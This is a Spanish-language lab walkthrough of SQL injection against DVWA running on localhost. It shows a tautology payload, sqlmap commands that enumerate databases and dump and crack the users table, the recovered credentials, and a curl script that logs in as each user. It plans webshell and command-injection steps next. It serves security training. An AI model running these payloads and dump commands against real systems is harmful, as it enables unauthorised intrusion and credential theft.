# 🔍 Explotación: SQL Injection (Low)

## 1️⃣ Identificación manual

1) URL vulnerable:

```Http
http://127.0.0.1:8080/vulnerabilities/sqli/
```

<img width="691" height="412" alt="imagen" src="https://github.com/user-attachments/assets/ba9986a7-8381-4829-a2f8-c6d8bb7a2c69" />

2) Ponemos ID = 1 y pulsamos **Submit**.


3) Payload básico: Payload que introduciremos al final de la URL anterior.

```Http
?id=1' OR '1'='1&Submit=Submit#
```

Resultado URL completa:

```Http
http://127.0.0.1:8080/vulnerabilities/sqli/?id=1' OR '1'='1&Submit=Submit#
```

Tras entrar, podremos ver el ***listado de todos los usuarios****.

<img width="669" height="430" alt="imagen" src="https://github.com/user-attachments/assets/184b860e-b07c-474f-8344-284703767d17" />


## 2️⃣ Enumerar bases de datos con sqlmap

**Objetivo:** 

Este comando utiliza ***sqlmap***, una herramienta automática de inyección SQL, para detectar y enumerar las bases de datos disponibles en una aplicación vulnerable. En este caso, se apunta a DVWA (Damn Vulnerable Web Application) corriendo en local.

### 🧩 Explicación del comando

```bash
sqlmap -u "http://127.0.0.1:8080/vulnerabilities/sqli/?id=1" \
       --cookie="PHPSESSID=abc123xyz456; security=low" \
       --dbs
```

- **sqlmap:** Ejecuta la herramienta sqlmap.
- **-u "http://127.0.0.1:8080/vulnerabilities/sqli/?id=1"**: URL del parámetro vulnerable (id=1) que vamos a probar.
- **--cookie="PHPSESSID=abc123xyz456; security=low"**: Cookies necesarias para mantener sesión activa y el nivel de seguridad bajo.
- **--dbs**: Indica a sqlmap que enumere las bases de datos disponibles en el servidor.

### ✅ Requisitos previos

- DVWA debe estar corriendo en el puerto 8080.
- Debes haber iniciado sesión en DVWA desde el navegador para obtener una cookie válida (PHPSESSID).
- El nivel de seguridad debe estar configurado en low para facilitar la explotación.

### 📌 Resultado esperado

Si el objetivo es vulnerable, sqlmap mostrará algo como:

```Code
available databases [2]:
[*] dvwa
[*] information_schema
```

### 📌 Resultado real consola

<img width="884" height="235" alt="imagen" src="https://github.com/user-attachments/assets/ceaf0540-eb72-4fea-9e9a-b70272226e6e" />

Esto indica que ha detectado las bases de datos disponibles en el sistema, incluyendo la base de datos principal de DVWA.


## 3️⃣ Ver tablas en la base dvwa

**Objetivo:** 

Este comando enumera todas las tablas existentes dentro de la base de datos dvwa, previamente identificada con sqlmap. Es útil para saber qué estructuras de datos contiene la aplicación vulnerable.

### 🧩 Explicación del comando

```bash
sqlmap -u "http://127.0.0.1:8080/vulnerabilities/sqli/?id=1" \
       --cookie="PHPSESSID=abc123xyz456; security=low" \
       -D dvwa --tables
```

- **-D dvwa**: Especifica la base de datos objetivo (dvwa).
- **--tables**: Solicita a sqlmap que enumere todas las tablas dentro de esa base.

### ✅ Requisitos previos

- Haber identificado previamente la base de datos dvwa con el parámetro --dbs.
- Mantener la sesión activa con la cookie válida.

### 📌 Resultado esperado

Si la base contiene tablas, sqlmap mostrará algo como:

```Code
Database: dvwa
[1 table]
+--------+
| users  |
+--------+
```

### 📌 Resultado real consola:

<img width="874" height="286" alt="imagen" src="https://github.com/user-attachments/assets/735b9a5f-1f05-468d-8264-3426af57d42e" />

Esto indica que la base dvwa contiene una tabla llamada users, que probablemente almacene credenciales o información sensible.

## 4️⃣ Extraer datos de la tabla users

**Objetivo:**

Este comando extrae el contenido completo de la tabla users dentro de la base dvwa. Es una fase crítica en la explotación, ya que permite visualizar datos como nombres de usuario y contraseñas.

Cuando se ejecute, deberemos aprobar o denegar algunas órdenes de la ejecución que son:

1. Reconocer las columnas de la tabla users.
2. Encuentra hashes MD5 en la columna password.
3. Pregunta si quieres guardarlos en un archivo temporal.
4. Te pregunta si quieres crackearlos usando ataque por diccionario.
5. Ahora usa el diccionario por defecto (wordlist.txt), con sufijos comunes activados (opción slow).

Cuando termine:

```pgsql
[INFO] cracked password: 'password123'
```

### 🧩 Explicación del comando

```bash
sqlmap -u "http://127.0.0.1:8080/vulnerabilities/sqli/?id=1" \
       --cookie="PHPSESSID=abc123xyz456; security=low" \
       -D dvwa -T users --dump
```

- **-D dvwa**: Selecciona la base de datos dvwa.
- **-T users**: Especifica la tabla users como objetivo.
- **--dump**: Extra y muestra todos los datos almacenados en esa tabla.

### ✅ Requisitos previos

- Haber identificado la tabla users con el parámetro --tables.
- Tener una sesión activa con la cookie correspondiente.

### 📌 Resultado esperado

El resultado puede incluir algo como:

```Code
Database: dvwa
Table: users
[5 entries]
+----+----------+----------+------------------+
| id | username | password | hash             |
+----+----------+----------+------------------+
| 1  | admin    | password | 5f4dcc3b5aa765d...|
...
```

### 📌 Resultado real consola:

<img width="1284" height="286" alt="imagen" src="https://github.com/user-attachments/assets/6c9ae0b0-86a4-49c5-8ee7-378db00eb221" />

Esto revela las credenciales almacenadas en la aplicación, que pueden ser utilizadas para acceder como administrador o realizar otras pruebas de seguridad.

**Observaciones:**

- Contraseñas débiles y repetidas (password repetida en admin y smithy).
- Todas las contraseñas fueron crackeadas con diccionario por defecto + sufijos comunes.
- El sistema no parece tener bloqueo por intentos fallidos (failed_login = 0 en todos).


## 4️⃣ Tras exiltrar y crackear las credenciales

Las debemos usar para obtener acceso legítimo a la aplicaciíon DVWA con distintos usuarios para:

1. Ver las diferencias de permisos (si las hubiera) entre usuarios.
2. Buscar funcionalidades internas que no estén visibles sin autenticación.
3. Plantear ataques post-instrusión (subida de ficheros, ejecución de comandos, XSS interno, etc).

### 🔹 Paso 1 — Entrar a DVWA con las credenciales obtenida

Tenemos 5 usuarios válidos:

| Usuario | Contraseña |
| ------- | ---------- |
| admin   | password   |
| gordonb | abc123     |
| 1337    | charley    |
| pablo   | letmein    |
| smithy  | password   |

Accedemos manualmente en la página de login de DVWA:

```arduino
http://127.0.0.1:8080/login.php
```

Probamos a iniciar sesión con cada usuario y anotamos:

- Si se muestran menús o opciones diferentes.
- Si el nivel de permisos cambia (DVWA no siempre lo implementa, pero es buen hábito revisarlo).
- Fecha y hora del último acceso (puede ser útil para simular un análisis forense).

1) **Usuario gordonb con contraseña abc123:**

- **Nivel de seguridad actual** -> LOW

Podemos verlo en la parte inferior de la pantalla en: Security level: low/medium/high.

- **Opciones del menú lateral** -> Todas

Por ejemplo: SQL Inejction, Command Injection, File Upload...). Si tenemos más o menos opciones según el usuario, eso sería una ***diferencia de permisos***.

- **Contenido personalizado** -> Ninguno.

En DVWA normalmente no hay, pero en webs reales podría mostrar dashboards diferentes.

2) **Resto de usuarios tienen misma configuración**

### 🔹 Paso 2 — Guardar cookies de cada usuario

Una vez logueado con un usuario:

- Abrimos herramientas de desarrollador → Almacenamiento / Cookies.
- Copia el valor de PHPSESSID y security para poder automatizar pruebas con curl o sqlmap.

Esto nos permitirá más adelante:

- **Explotar vulnerabilidades autenticadas.**
- Realizar **fuerza bruta de paneles internos** si existieran.
- Hacer **RCE (Remote Code Execution)** en módulos como Command Injection.

            
┌──(javier㉿kali)-[~/Pentesting/DVWA]
└─$ ~/Pentesting/DVWA/compare_dvwa_users.sh
[✅] Cookie para pablo: PHPSESSID=8gttcqpe1jcmkim7ik1ctvcon5
[✅] Cookie para smithy: PHPSESSID=q4nj3ki3rk9g35bnlmnnhubfj5
[=] smithy es igual al admin.
[✅] Cookie para 1337: PHPSESSID=qpqbstq2qdne4f2dmp1s2olgn7
[=] 1337 es igual al admin.
[✅] Cookie para gordonb: PHPSESSID=b6agp4c402rc5ff431v45mqiu5
[=] gordonb es igual al admin.
[✅] Cookie para admin: PHPSESSID=l6ai6unl2n0b018e14oau9un82
[=] admin es igual al admin.
📂 HTML guardados en: /home/javier/Pentesting/DVWA/sessions

Comprobado que todos los usuarios ven el mismo contenido que el admin, lo que confirma que:

- No hay control de permisos por usuario.
- Cualquier usuario logueado puede acceder a las mismas funciones.
- Esto es un fallo de **Broken Access Control** (control de acceso roto).


                                                                                           
#### SCRIPT compare_dvwa_users.sh

Este script realiza las acciones:

- Prueba automáticamente cada usuario/contraseña que hemos obtenido.
- Guarda el HTML que recibe en la carpeta ~/Pentesting/DVWA/sessions/
- Compara cada HTML con el del admin y te dice si hay diferencias.

Guárdalo en ~/Pentesting/DVWA/compare_dvwa_users.sh:

```Bash
#!/bin/bash

# 📂 Carpeta donde guardaremos los HTML
OUTPUT_DIR="$HOME/Pentesting/DVWA/sessions"
mkdir -p "$OUTPUT_DIR"

# 🌐 URL base de DVWA
BASE_URL="http://127.0.0.1:8080"

# 🔑 Lista de usuarios y contraseñas obtenidos
declare -A USERS
USERS[admin]="password"
USERS[gordonb]="abc123"
USERS[1337]="charley"
USERS[pablo]="letmein"
USERS[smithy]="password"

# 🍪 Función para obtener cookie PHPSESSID después de login
get_cookie() {
    USER=$1
    PASS=$2
    COOKIE=$(curl -s -i "$BASE_URL/login.php" \
        -d "username=$USER&password=$PASS&Login=Login" \
        | grep -i "Set-Cookie" | grep -o "PHPSESSID=[^;]*" | head -n 1)
    echo "$COOKIE"
}

# 📄 Guardar HTML para cada usuario
first=true
for USER in "${!USERS[@]}"; do
    PASS="${USERS[$USER]}"
    COOKIE=$(get_cookie "$USER" "$PASS")

    if [ -z "$COOKIE" ]; then
        echo "[❌] No se pudo obtener cookie para $USER:$PASS"
        continue
    fi

    echo "[✅] Cookie para $USER: $COOKIE"

    FILE="$OUTPUT_DIR/index_${USER}.html"
    curl -s "$BASE_URL/index.php" -H "Cookie: $COOKIE; security=low" > "$FILE"

    # Guardar el primero como base para comparación
    if $first; then
        BASE_FILE="$FILE"
        first=false
    else
        DIFF=$(diff -q "$BASE_FILE" "$FILE")
        if [ -z "$DIFF" ]; then
            echo "[=] $USER es igual al admin."
        else
            echo "[⚠] $USER tiene diferencias con admin."
        fi
    fi
done

echo "📂 HTML guardados en: $OUTPUT_DIR"
```

##### Instrucciones de uso

```bash
chmod +x ~/Pentesting/DVWA/compare_dvwa_users.sh
~/Pentesting/DVWA/compare_dvwa_users.sh
```

Esto genera:

- Todos los archivos index_usuario.html en ~/Pentesting/DVWA/sessions/
- Una comparación automática con el del admin.
- Un log en pantalla indicando si son iguales o diferentes.



### 🔹 Paso 3 — Elegir el primer ataque post-login

Empezaríamos con:

1. **Command Injection:** para obtener ejecución de comandos en el servidor.
2. **File Upload:** para subir una ***webshell*** y ganar acceso total al sistema.





## 📥 Guardar resultados en archivos de texto

Tras las primeras pruebas de explotación en DVWA empezamos a guardar la información que vamos recopilando de los tres comandos anteriormente ejecutados

### 1️⃣ Bases de datos detectadas

Podemos hacerlo de forma convencional usando el argumento **>** y la ruta a la que deseemos guardarla. 

Ejemplo: > /home/javier/Pentesting/DVWA/loot/databases_submit.txt

```bash
sqlmap -u "http://127.0.0.1:8080/vulnerabilities/sqli/?id=1&Submit=Submit#" \
       --cookie="PHPSESSID=f733da4srmcuf6rtjb0tfniep1; security=low" \
       --dbs > /home/javier/Pentesting/DVWA/loot/databases_submit.txt
```

🔸 Guarda la lista de bases de datos en databases_submit.txt.

### 2️⃣ Tablas en la base dvwa

```Bash
sqlmap -u "http://127.0.0.1:8080/vulnerabilities/sqli/?id=1&Submit=Submit#" \
       --cookie="PHPSESSID=f733da4srmcuf6rtjb0tfniep1; security=low" \
       -D dvwa --tables > /home/javier/Pentesting/DVWA/loot/tables_submit.txt
```

🔸 Guarda las tablas encontradas en tables_submit.txt.

### 3️⃣ Volcado de la tabla users

```Bash
sqlmap -u "http://127.0.0.1:8080/vulnerabilities/sqli/?id=1&Submit=Submit#" \
       --cookie="PHPSESSID=f733da4srmcuf6rtjb0tfniep1; security=low" \
       -D dvwa -T users --dump > /home/javier/Pentesting/DVWA/loot/users_dump_submit.txt
```

🔸 Guarda el contenido completo de la tabla users en users_dump_submit.txt.

### 🧠 Tip extra: Añadir fecha al archivo automáticamente

Si quieres que los archivos incluyan la fecha en el nombre, puedes hacer esto:

```Bash
sqlmap ... > /home/javier/Pentesting/DVWA/loot/databases_$(date +%F).txt
```

🔹 Esto generará un archivo como databases_2025-08-15.txt.

## 📸 Guardar capturas de pantalla en Kali Linux

### ✅ Herramientas recomendadas

| Herramienta        | Descripción                                           | Comando básico                                              |
|--------------------|-------------------------------------------------------|-------------------------------------------------------------|
| `gnome-screenshot` | Herramienta nativa en entornos GNOME                 | `gnome-screenshot -f ~/Pentesting/DVWA/screens/captura.png` |
| `flameshot`        | Muy popular entre pentesters, permite edición rápida | `flameshot gui`                                              |
| `scrot`            | Ligera y rápida, ideal para terminal                 | `scrot ~/Pentesting/DVWA/screens/captura.png`               |


### 🧰 Ejemplos de uso

#### 📷 Captura completa con gnome-screenshot

```bash
gnome-screenshot -f ~/Pentesting/DVWA/screens/dvwa_login.png
```

🔸 Guarda una captura de toda la pantalla con nombre dvwa_login.png.

#### ✂️ Captura interactiva con flameshot

```Bash
flameshot gui
```

🔸 Se abre una interfaz para seleccionar área, dibujar, y guardar. 
🔸 Puedes configurar el directorio de guardado en las opciones o usar:

```Bash
flameshot gui -p ~/Pentesting/DVWA/screens/
```

#### 📸 Captura rápida con scrot

```Bash
scrot ~/Pentesting/DVWA/screens/dvwa_users.png
```

🔸 Captura inmediata de toda la pantalla y guarda en el directorio screens.

## 🍪 ¿Cómo obtener la cookie PHPSESSID?

### 🔹 Opción 1: Desde navegador

1. F12 → pestaña **Storage/Application**.
2. Buscar cookies de http://127.0.0.1:8080.
3. Copiar valor de PHPSESSID.

### 🔹 Opción 2: Desde terminal

```bash
curl -i http://127.0.0.1:8080/login.php
```

Buscar línea:

```Http
Set-Cookie: PHPSESSID=abcdef1234567890; path=/
```

## 📸 Documentación de evidencias

- Guardar respuestas HTTP:

```bash
curl -s -D ~/Pentesting/DVWA/requests/sqli_login.headers \
     -o ~/Pentesting/DVWA/requests/sqli_login.html \
     "http://127.0.0.1:8080/vulnerabilities/sqli/?id=1' OR '1'='1&Submit=Submit#"
```
